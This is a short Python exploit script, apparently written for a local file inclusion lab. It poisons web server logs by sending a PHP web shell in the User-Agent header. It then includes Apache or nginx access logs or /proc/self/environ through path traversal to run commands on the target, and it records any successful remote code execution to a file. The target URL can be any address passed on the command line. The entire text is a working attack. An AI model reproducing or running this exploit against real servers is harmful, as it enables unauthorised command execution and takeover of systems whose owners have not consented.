import requests
import sys
import time

target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000/lfi_lab.php"
log_paths = [
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/nginx/access.log",
    "../../../../proc/self/environ"
]
cmd = "id"
shell_code = "<?php system($_GET['x']); ?>"

for log in log_paths:
    inject = requests.get(target, headers={"User-Agent": shell_code})
    rce = requests.get(f"{target}?file={log}&x={cmd}")
    if "uid=" in rce.text:
        print(f"\033[92m[RCE] {log} -> {rce.text.strip()}\033[0m")
        with open("../logs/lfi_shell.txt", "w") as f:
            f.write(rce.text)
        break
    else:
        print(f"\033[91m[FAIL] {log}\033[0m")
    time.sleep(1)